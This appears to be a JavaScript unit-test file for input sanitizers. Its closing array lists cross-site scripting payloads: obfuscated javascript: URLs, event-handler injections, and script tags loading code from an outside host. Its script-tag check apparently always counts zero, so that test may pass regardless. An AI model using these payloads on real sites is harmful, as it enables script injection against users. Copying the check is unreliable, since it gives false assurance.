/*globals describe, it*/
import chai from 'chai';
import { sanitizeStringFields, sanitizeByProperty } from './utils';
import cheerio from 'cheerio';

const expect = chai.expect;

describe("sanitizeByProperty", function(){
  it("should throw if not given an Array as first argument", function(){
    expect(() => sanitizeByProperty("something", {non:"empty"}))
    .to.throw(Error, "propertyArray needs an array of keys, non-array or empty array given");
  });
  it("should throw if a given an empty Array as first argument", function(){
    expect(() => sanitizeByProperty([], {non:"empty"}))
    .to.throw(Error, "propertyArray needs an array of keys, non-array or empty array given");
  })
  it("should throw if not given an Object as second argument", function(){
    expect(() => sanitizeByProperty(["somekey"], []))
    .to.throw(Error, "sourceObj needs a non-empty object. Empty object given");
  });
  it("should throw if a given an empty Object as second argument", function(){
    expect(() => sanitizeByProperty(["somekey"], {}))
    .to.throw(Error, "sourceObj needs a non-empty object. Empty object given");
  });
  it("should return an object with property keys equivalent to the array values", function(){
    const _keys = ['one', 'two', 'three', 'four'];
    const _obj = {two: "two val", four: "four val"}
    const result = sanitizeByProperty(_keys, _obj);
    // only two and four should be present
    expect(Object.keys(result)).to.eql(['two', 'four'])
  });
});

describe("sanitizeStringFields", function(){
  it("should clean potential XSS threats", function(){
    const t = xss.forEach(x => {
      const _html = sanitizeStringFields({description:x});
      const _text = sanitizeStringFields({title:x});
      expect(htmlHasScriptTag(_html.description)).to.equal(0);
      expect(htmlHasScriptTag(_text.title)).to.equal(0);
    });
  });
  it("should return no html tags if properties are text only fields", function(){
    const _obj = {
      _id: "<p>Some HTML string</p>",
      title: "<h1>Some HTML string</h1>",
      to: "<h1>Some HTML <small>string</small></h1>",
      icon: "<i class='something'>Some HTML string</i>",
      featuredImage: "<img src='/some/thing' />Some HTML string"
    }
    const result = sanitizeStringFields(_obj);
    Object.keys(result).map(k => {
      const $ = cheerio.load(result[k])
      expect($.html()).to.equal($.text())
    })
  });
});

const htmlHasScriptTag = (html) => {
  const $ = cheerio.load(html);
  return $('script').find().length;
}

const xss = [
  `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`,
  `<IMG SRC="javascript:alert('XSS');">`,
  `<IMG SRC=JaVaScRiPt:alert('XSS')>`,
  `<IMG SRC=javascript:alert("XSS")>`,
  `<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`,
  `<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
  `<IMG SRC=# onmouseover="alert('xxs')">`,
  `<IMG SRC= onmouseover="alert('xxs')">`,
  `<IMG onmouseover="alert('xxs')">`,
  `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
  `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
  `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
  `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
  `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
  `<IMG SRC="jav	ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
  `perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out`,
  `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`,
  `<<SCRIPT>alert("XSS");//<</SCRIPT>`,
  `<SCRIPT SRC=http://xss.rocks/xss.js?< B >`
]
